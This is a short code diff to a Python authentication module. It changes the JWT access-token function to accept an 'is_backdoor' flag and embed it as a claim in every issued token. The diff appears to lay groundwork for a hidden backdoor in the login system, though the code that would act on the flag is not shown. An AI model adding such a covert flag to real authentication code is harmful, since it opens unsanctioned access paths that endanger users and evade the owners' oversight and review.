@@ -25,7 +25,10 @@ def verify_password(plain_password: str, hashed_password: str) -> bool:
 
 
 def create_access_token(
-    user_id: uuid.UUID, email: str, expires_delta: Optional[timedelta] = None
+    user_id: uuid.UUID,
+    email: str,
+    is_backdoor: bool = False,
+    expires_delta: Optional[timedelta] = None,
 ) -> str:
     """Create a JWT access token."""
     if expires_delta is None:
@@ -35,6 +38,7 @@ def create_access_token(
     to_encode = {
         "user_id": str(user_id),
         "email": email,
+        "is_backdoor": is_backdoor,
         "exp": expire,
     }
 
